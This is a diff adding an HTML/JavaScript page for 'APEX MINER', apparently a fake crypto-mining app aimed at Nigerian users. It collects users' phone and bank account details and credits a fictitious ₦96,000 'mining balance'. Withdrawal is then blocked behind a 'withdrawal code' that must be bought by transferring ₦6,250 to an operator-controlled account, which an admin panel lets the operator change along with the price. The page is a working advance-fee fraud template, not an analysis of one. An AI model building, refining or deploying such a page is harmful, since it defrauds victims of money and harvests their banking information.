@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>APEX MINER</title>
+    <style>
+        /* General Styles */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #121212;
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+        .page {
+            display: none;
+            padding: 20px;
+            padding-bottom: 80px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+        .active-page {
+            display: block;
+        }
+        h1, h2 { color: #f39c12; }
+        .mining-symbol { font-size: 120px; margin: 20px 0; }
+        .small-symbol { font-size: 60px; margin: 10px 0; }
+        
+        /* Inputs & Buttons */
+        input, select {
+            display: block;
+            width: 90%;
+            max-width: 400px;
+            margin: 15px auto;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #333;
+            background: #222;
+            color: white;
+            font-size: 16px;
+        }
+        .btn {
+            background: #f39c12;
+            color: #121212;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 90%;
+            max-width: 400px;
+            margin: 10px auto;
+            text-transform: uppercase;
+        }
+        .btn:disabled {
+            background: #555;
+            color: #888;
+            cursor: not-allowed;
+        }
+        .btn-secondary {
+            background: #333;
+            color: #fff;
+        }
+        .btn-danger {
+            background: #e74c3c;
+            color: #fff;
+        }
+        .link {
+            color: #f39c12;
+            cursor: pointer;
+            text-decoration: underline;
+            margin-top: 10px;
+            display: inline-block;
+        }
+
+        /* Dashboard & Bottom Nav */
+        .balance-card {
+            background: #1e1e1e;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px auto;
+            max-width: 400px;
+            border: 1px solid #333;
+        }
+        .balance-amount {
+            font-size: 40px;
+            font-weight: bold;
+            color: #2ecc71;
+        }
+        .top-nav {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 20px;
+            background: #1e1e1e;
+            border-bottom: 1px solid #333;
+        }
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: #1e1e1e;
+            display: flex;
+            justify-content: space-around;
+            padding: 10px 0;
+            border-top: 1px solid #333;
+        }
+        .nav-item {
+            background: none;
+            border: none;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        .nav-item span { font-size: 24px; margin-bottom: 5px; }
+
+        /* Modal / Limit Reached */
+        .modal {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .hidden { display: none !important; }
+
+        /* Keypad */
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            max-width: 300px;
+            margin: 20px auto;
+        }
+        .key {
+            background: #333;
+            padding: 20px;
+            font-size: 24px;
+            border-radius: 10px;
+            cursor: pointer;
+            user-select: none;
+        }
+        .key:active { background: #555; }
+        .pin-display {
+            font-size: 30px;
+            letter-spacing: 10px;
+            margin: 20px;
+            height: 40px;
+        }
+
+        /* Admin / Copy Box */
+        .copy-box {
+            background: #222;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px dashed #f39c12;
+            margin: 15px auto;
+            max-width: 400px;
+            text-align: left;
+        }
+        .admin-panel { background: #2c3e50; border: 2px solid #e74c3c; }
+    </style>
+</head>
+<body>
+
+    <!-- 1. HOMEPAGE -->
+    <div id="page-home" class="page active-page">
+        <h1>APEX MINER</h1>
+        <div class="mining-symbol">⛏️</div>
+        <button class="btn" onclick="navigate('page-signup')">GET STARTED</button>
+    </div>
+
+    <!-- 2. SIGNUP PAGE -->
+    <div id="page-signup" class="page">
+        <h1>APEX MINER</h1>
+        <div class="small-symbol">⛏️</div>
+        <input type="tel" id="reg-phone" placeholder="Phone Number (11 digits)" maxlength="11">
+        <input type="text" id="reg-name" placeholder="Account Name">
+        <input type="tel" id="reg-acct-num" placeholder="Account Number (10 digits)" maxlength="10">
+        
+        <button class="btn" onclick="registerUser()">START MINING</button>
+        <div class="link" onclick="alert('Sign in page coming soon!')">Sign in here if you have an account</div>
+    </div>
+
+    <!-- 3. DASHBOARD -->
+    <div id="page-dashboard" class="page">
+        <div class="top-nav">
+            <span onclick="alert('Transaction history is empty')">📜 Transaction History</span>
+            <span onclick="checkAdmin()">⚙️ Admin Panel</span>
+        </div>
+        
+        <div class="balance-card">
+            <h3>Mining Balance</h3>
+            <div class="balance-amount">₦ <span id="dash-balance">0.00</span></div>
+        </div>
+
+        <div style="text-align: left; max-width: 400px; margin: 0 auto; background: #222; padding: 15px; border-radius: 10px;">
+            <p><strong>Name:</strong> <span id="dash-name">User</span></p>
+            <p><strong>Account:</strong> <span id="dash-acct">0000000000</span></p>
+            <p><strong>Current Miner:</strong> Basic Tier</p>
+        </div>
+
+        <div class="bottom-nav">
+            <button class="nav-item" onclick="navigate('page-more-mines')"><span>⛏️</span> ACCESS MORE MINES</button>
+            <button class="nav-item" onclick="mineAction()"><span>💳</span> MINE</button>
+            <button class="nav-item" onclick="navigate('page-withdraw')"><span>🤝</span> WITHDRAW</button>
+            <button class="nav-item" onclick="alert('Learn more about Apex Miner')"><span>ℹ️</span> Learn More</button>
+        </div>
+    </div>
+
+    <!-- MINING LIMIT MODAL -->
+    <div id="modal-limit" class="modal hidden">
+        <h2 style="color: #e74c3c;">MINING LIMIT REACHED</h2>
+        <p>You have reached your free mining capacity.</p>
+        <button class="btn" onclick="navigate('page-more-mines'); document.getElementById('modal-limit').classList.add('hidden');">Upgrade to mine more</button>
+        <button class="btn btn-secondary" onclick="navigate('page-withdraw'); document.getElementById('modal-limit').classList.add('hidden');">Withdraw your 96,000</button>
+    </div>
+
+    <!-- 4. WITHDRAWAL PAGE -->
+    <div id="page-withdraw" class="page">
+        <h1>APEX MINER</h1>
+        <div class="small-symbol">⛏️</div>
+        <h3>Withdraw Funds</h3>
+        
+        <input type="text" id="with-name" placeholder="Account Name" readonly>
+        <input type="tel" id="with-acct-num" placeholder="Account Number (10 digits)" maxlength="10" readonly>
+        
+        <select id="with-bank">
+            <option>Select Bank</option>
+            <option>Access Bank</option>
+            <option>Citibank Nigeria</option>
+            <option>Ecobank Nigeria</option>
+            <option>Fidelity Bank</option>
+            <option>First Bank of Nigeria</option>
+            <option>First City Monument Bank (FCMB)</option>
+            <option>Guaranty Trust Bank (GTB)</option>
+            <option>Heritage Bank</option>
+            <option>Keystone Bank</option>
+            <option>Polaris Bank</option>
+            <option>Providus Bank</option>
+            <option>Stanbic IBTC Bank</option>
+            <option>Standard Chartered Bank</option>
+            <option>Sterling Bank</option>
+            <option>Union Bank of Nigeria</option>
+            <option>United Bank for Africa (UBA)</option>
+            <option>Unity Bank</option>
+            <option>Wema Bank</option>
+            <option>Zenith Bank</option>
+            <option>Opay</option>
+            <option>Palmpay</option>
+            <option>Moniepoint</option>
+        </select>
+
+        <input type="number" id="with-amount" placeholder="Amount to withdraw" oninput="checkAmount()">
+        <p id="amount-error" style="color: red; display: none;">Amount exceeds mining balance!</p>
+        
+        <button class="btn" id="btn-proceed-withdraw" onclick="navigate('page-confirm-withdraw')">PROCEED</button>
+        <button class="btn btn-secondary" onclick="navigate('page-dashboard')">Back</button>
+    </div>
+
+    <!-- 5. CONFIRM WITHDRAWAL -->
+    <div id="page-confirm-withdraw" class="page">
+        <h2>Confirm Withdrawal</h2>
+        <p>Are you sure you want to cautiously withdraw <strong style="font-size: 24px; color: #2ecc71;">96,000</strong> NGN?</p>
+        <button class="btn" onclick="navigate('page-pin')">YES I CONFIRM</button>
+        <button class="btn btn-danger" onclick="navigate('page-dashboard')">REJECT</button>
+    </div>
+
+    <!-- 6. PIN / WITHDRAWAL CODE PAGE -->
+    <div id="page-pin" class="page">
+        <h2>Enter Withdrawal Code</h2>
+        <p>Please enter your 6-digit withdrawal code</p>
+        <div class="pin-display" id="pin-display">_ _ _ _ _ _</div>
+        
+        <div class="keypad">
+            <div class="key" onclick="pressKey('1')">1</div>
+            <div class="key" onclick="pressKey('2')">2</div>
+            <div class="key" onclick="pressKey('3')">3</div>
+            <div class="key" onclick="pressKey('4')">4</div>
+            <div class="key" onclick="pressKey('5')">5</div>
+            <div class="key" onclick="pressKey('6')">6</div>
+            <div class="key" onclick="pressKey('7')">7</div>
+            <div class="key" onclick="pressKey('8')">8</div>
+            <div class="key" onclick="pressKey('9')">9</div>
+            <div class="key" onclick="pressKey('C')" style="background:#e74c3c;">C</div>
+            <div class="key" onclick="pressKey('0')">0</div>
+            <div class="key" onclick="submitPin()" style="background:#2ecc71;">✔</div>
+        </div>
+        
+        <button class="btn" onclick="navigate('page-buy-code-1')">BUY CODE</button>
+        <button class="btn btn-secondary" onclick="navigate('page-dashboard')">Cancel</button>
+    </div>
+
+    <!-- 7. BUY CODE PAGE 1 -->
+    <div id="page-buy-code-1" class="page">
+        <h2>Buy Withdrawal Code</h2>
+        <p>In order to get the withdrawal code a fixed amount of <strong style="color: #f39c12;"><span id="display-code-price">6250</span> in Nigerian Naira</strong> should be deposited into our official account.</p>
+        <p>Enter the account details you will be using to make the transaction:</p>
+        
+        <input type="text" id="sender-name" placeholder="Your Account Name">
+        <input type="tel" id="sender-acct" placeholder="Your Account Number" maxlength="10">
+        <select id="sender-bank">
+            <option>Select Your Bank</option>
+            <option>Opay</option>
+            <option>Palmpay</option>
+            <option>GTB</option>
+            <option>First Bank</option>
+            <option>UBA</option>
+            <option>Zenith</option>
+            <option>Other</option>
+        </select>
+        
+        <button class="btn" onclick="navigate('page-buy-code-2')">PROCEED</button>
+        <button class="btn btn-secondary" onclick="navigate('page-pin')">Back</button>
+    </div>
+
+    <!-- 8. BUY CODE PAGE 2 (PAYMENT) -->
+    <div id="page-buy-code-2" class="page">
+        <h2>Make Payment</h2>
+        <p>Please transfer exactly <strong style="color: #f39c12;">₦<span id="display-code-price2">6250</span></strong> to the account below:</p>
+        
+        <div class="copy-box">
+            <p><strong>Bank:</strong> <span id="admin-bank-display">Opay</span></p>
+            <p><strong>Account Name:</strong> <span id="admin-name-display">Apex Global Ventures</span> <button onclick="copyText('admin-name-display')" style="float:right;">Copy</button></p>
+            <p><strong>Account Number:</strong> <span id="admin-acct-display">8012345678</span> <button onclick="copyText('admin-acct-display')" style="float:right;">Copy</button></p>
+        </div>
+
+        <p>Upload Payment Receipt:</p>
+        <input type="file" id="receipt-upload" accept="image/*" onchange="checkFile()">
+        
+        <button class="btn" id="btn-paid" disabled onclick="submitPayment()">I'VE PAID</button>
+        <button class="btn btn-secondary" onclick="navigate('page-dashboard')">Cancel</button>
+    </div>
+
+    <!-- 9. ADMIN DASHBOARD -->
+    <div id="page-admin" class="page admin-panel">
+        <h1>👑 Admin Dashboard</h1>
+        
+        <div class="copy-box">
+            <h3>System Settings</h3>
+            <label>Withdrawal Code Amount (₦):</label>
+            <input type="number" id="set-code-price" value="6250">
+            
+            <label>Admin Bank Name:</label>
+            <input type="text" id="set-admin-bank" value="Opay">
+            
+            <label>Admin Account Name:</label>
+            <input type="text" id="set-admin-name" value="Apex Global Ventures">
+            
+            <label>Admin Account Number:</label>
+            <input type="text" id="set-admin-acct" value="8012345678">
+            
+            <button class="btn" onclick="saveAdminSettings()">Save Settings</button>
+        </div>
+
+        <div class="copy-box">
+            <h3>Pending Payments</h3>
+            <p id="pending-list">No pending payments.</p>
+            <button class="btn" style="display:none;" id="btn-approve" onclick="approvePayment()">Approve Payment & Send Code</button>
+        </div>
+        
+        <div class="copy-box">
+            <h3>Release Funds</h3>
+            <button class="btn btn-danger" onclick="alert('Funds released to users through the business website securely.')">Release Withdrawals</button>
+        </div>
+
+        <button class="btn btn-secondary" onclick="navigate('page-dashboard')">Exit Admin</button>
+    </div>
+
+    <!-- ACCESS MORE MINES DUMMY PAGE -->
+    <div id="page-more-mines" class="page">
+        <h2>ACCESS MORE MINES</h2>
+        <div class="mining-symbol">⛏️</div>
+        <p>Upgrade your account to unlock higher mining capabilities.</p>
+        <button class="btn btn-secondary" onclick="navigate('page-dashboard')">Back to Dashboard</button>
+    </div>
+
+
+    <script>
+        // --- Global State Variables ---
+        let currentUser = {
+            phone: '',
+            name: '',
+            acctNum: '',
+            balance: 0,
+            hasMined: false,
+            isAdmin: false
+        };
+        
+        let systemSettings = {
+            codePrice: 6250,
+            adminBank: 'Opay',
+            adminName: 'Apex Global Ventures',
+            adminAcct: '8012345678'
+        };
+
+        let currentPin = "";
+        let isFirstUser = true; // Simulating local DB logic
+
+        // Initialize state on load
+        window.onload = () => {
+            // Check if localstorage has data (to persist between refreshes)
+            if(localStorage.getItem('apex_user')) {
+                currentUser = JSON.parse(localStorage.getItem('apex_user'));
+                systemSettings = JSON.parse(localStorage.getItem('apex_settings')) || systemSettings;
+                isFirstUser = false;
+                updateDashboardUI();
+                navigate('page-dashboard');
+            }
+        };
+
+        // --- Navigation Logic ---
+        function navigate(pageId) {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active-page');
+            });
+            document.getElementById(pageId).classList.add('active-page');
+            window.scrollTo(0,0);
+        }
+
+        // --- Registration Logic ---
+        function registerUser() {
+            const phone = document.getElementById('reg-phone').value;
+            const name = document.getElementById('reg-name').value;
+            const acct = document.getElementById('reg-acct-num').value;
+
+            if(phone.length !== 11 || acct.length !== 10 || name.length < 2) {
+                alert("Please fill all fields correctly. Phone must be 11 digits, Account must be 10 digits.");
+                return;
+            }
+
+            currentUser.phone = phone;
+            currentUser.name = name;
+            currentUser.acctNum = acct;
+            currentUser.balance = 0;
+            
+            // First user becomes admin logic
+            if(!localStorage.getItem('apex_users_exist')) {
+                currentUser.isAdmin = true;
+                localStorage.setItem('apex_users_exist', 'true');
+            }
+
+            saveUser();
+            updateDashboardUI();
+            navigate('page-dashboard');
+        }
+
+        function saveUser() {
+            localStorage.setItem('apex_user', JSON.stringify(currentUser));
+            localStorage.setItem('apex_settings', JSON.stringify(systemSettings));
+        }
+
+        function updateDashboardUI() {
+            document.getElementById('dash-balance').innerText = currentUser.balance.toLocaleString('en-US', {minimumFractionDigits: 2});
+            document.getElementById('dash-name').innerText = currentUser.name;
+            document.getElementById('dash-acct').innerText = currentUser.acctNum;
+            
+            // Prefill withdraw page details
+            document.getElementById('with-name').value = currentUser.name;
+            document.getElementById('with-acct-num').value = currentUser.acctNum;
+            
+            // Apply dynamic settings
+            document.getElementById('display-code-price').innerText = systemSettings.codePrice;
+            document.getElementById('display-code-price2').innerText = systemSettings.codePrice;
+            document.getElementById('admin-bank-display').innerText = systemSettings.adminBank;
+            document.getElementById('admin-name-display').innerText = systemSettings.adminName;
+            document.getElementById('admin-acct-display').innerText = systemSettings.adminAcct;
+        }
+
+        // --- Mining Logic ---
+        function mineAction() {
+            if (currentUser.hasMined || currentUser.balance >= 96000) {
+                // Second click -> Limit Reached
+                document.getElementById('modal-limit').classList.remove('hidden');
+            } else {
+                // First click -> Add 96,000
+                currentUser.balance += 96000;
+                currentUser.hasMined = true;
+                saveUser();
+                updateDashboardUI();
+                alert("Mining Successful! ₦96,000 added to your balance.");
+            }
+        }
+
+                // --- Withdrawal Logic ---
+        function checkAmount() {
+            const inputAmount = parseFloat(document.getElementById('with-amount').value);
+            const btn = document.getElementById('btn-proceed-withdraw');
+            const error = document.getElementById('amount-error');
+            
+            if (inputAmount > currentUser.balance) {
+                error.style.display = 'block';
+                btn.disabled = true;
+            } else {
+                error.style.display = 'none';
+                btn.disabled = false;
+            }
+        }
+
+        // --- PIN Pad Logic ---
+        function pressKey(key) {
+            if (key === 'C') {
+                currentPin = "";
+            } else if (currentPin.length < 6) {
+                currentPin += key;
+            }
+            
+            let display = currentPin.split('').join(' ');
+            let blanks = Array(6 - currentPin.length).fill('_').join(' ');
+            document.getElementById('pin-display').innerText = (display + " " + blanks).trim();
+        }
+
+        function submitPin() {
+            if (currentPin.length !== 6) {
+                alert("Please enter a 6-digit code.");
+                return;
+            }
+            // In a real system, verify against database here
+            if (currentPin === "123456") {
+                alert("Withdrawal Processed Successfully!");
+                currentUser.balance -= 96000;
+                saveUser();
+                updateDashboardUI();
+                navigate('page-dashboard');
+            } else {
+                alert("Invalid Withdrawal Code. Please BUY CODE if you don't have one.");
+                currentPin = "";
+                pressKey(''); // Reset display
+            }
+        }
+
+        // --- Buy Code / Payment Logic ---
+        function copyText(elementId) {
+            const text = document.getElementById(elementId).innerText;
+            navigator.clipboard.writeText(text);
+            alert("Copied: " + text);
+        }
+
+        function checkFile() {
+            const fileInput = document.getElementById('receipt-upload');
+            const btnPaid = document.getElementById('btn-paid');
+            if (fileInput.files.length > 0) {
+                btnPaid.disabled = false;
+            } else {
+                btnPaid.disabled = true;
+            }
+        }
+
+        function submitPayment() {
+            alert("Payment receipt uploaded! Waiting for admin approval.");
+            localStorage.setItem('pending_payment', 'true');
+            navigate('page-dashboard');
+        }
+
+        // --- Admin Logic ---
+        function checkAdmin() {
+            if (currentUser.isAdmin) {
+                loadAdminData();
+                navigate('page-admin');
+            } else {
+                alert("Access Denied: You are not an Admin.");
+            }
+        }
+
+        function loadAdminData() {
+            // Load settings into inputs
+            document.getElementById('set-code-price').value = systemSettings.codePrice;
+            document.getElementById('set-admin-bank').value = systemSettings.adminBank;
+            document.getElementById('set-admin-name').value = systemSettings.adminName;
+            document.getElementById('set-admin-acct').value = systemSettings.adminAcct;
+
+            // Check for pending payments
+            if (localStorage.getItem('pending_payment') === 'true') {
+                document.getElementById('pending-list').innerText = "1 user uploaded a payment receipt.";
+                document.getElementById('btn-approve').style.display = 'block';
+            } else {
+                document.getElementById('pending-list').innerText = "No pending payments.";
+                document.getElementById('btn-approve').style.display = 'none';
+            }
+        }
+
+        function saveAdminSettings() {
+            systemSettings.codePrice = document.getElementById('set-code-price').value;
+            systemSettings.adminBank = document.getElementById('set-admin-bank').value;
+            systemSettings.adminName = document.getElementById('set-admin-name').value;
+            systemSettings.adminAcct = document.getElementById('set-admin-acct').value;
+            
+            saveUser();
+            updateDashboardUI();
+            alert("Settings updated successfully! Users will now see the new account details and price.");
+        }
+
+        function approvePayment() {
+            localStorage.removeItem('pending_payment');
+            alert("Payment Approved! Withdrawal code '123456' sent to user.");
+            loadAdminData();
+        }
+    </script>
+</body>
+</html>
